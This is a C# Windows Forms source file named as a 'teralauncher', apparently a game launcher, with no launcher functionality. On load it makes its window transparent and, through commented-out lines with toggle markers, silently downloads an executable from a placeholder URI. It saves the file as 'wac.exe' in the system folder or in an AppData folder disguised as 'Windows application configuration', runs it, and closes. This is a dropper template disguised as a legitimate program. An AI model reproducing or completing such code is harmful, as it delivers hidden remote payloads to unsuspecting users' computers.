﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace teralauncher
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            TransparencyKey = this.BackColor;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            WebClient wc = new WebClient();
            //*Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows application configuration");
            //+wc.DownloadFile("#uri", Environment.GetFolderPath(Environment.SpecialFolder.SystemX86) + "\\wac.exe");
            //*wc.DownloadFile("#uri", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows application configuration\\wac.exe");
            //+Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.SystemX86) + "\\wac.exe");
            //*Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows application configuration\\wac.exe");
            this.Close();
        }
    }
}
